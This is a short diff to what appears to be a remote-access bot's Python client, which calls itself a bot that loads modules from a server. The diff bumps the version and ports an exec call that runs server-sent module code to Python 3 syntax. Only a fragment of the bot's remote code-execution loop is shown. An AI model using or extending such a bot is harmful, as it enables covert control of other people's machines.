@@ -3,7 +3,7 @@
 """Minimal bot which loads modules as they are needed from the server."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "4.1.0"
+__version__ = "4.1.1"
 
 import getpass
 import json
@@ -160,7 +160,7 @@ class ModuleTask(Thread):
         self._command.options["loader_options"] = LOADER_OPTIONS
 
         try:
-            exec module in module_dict
+            exec(module, module_dict)
             module_dict["run"](self._command.options)  # Thanks http://lucumr.pocoo.org/2011/2/1/exec-in-python/
         except Exception:
             send_response("Error executing module: \n" + traceback.format_exc())
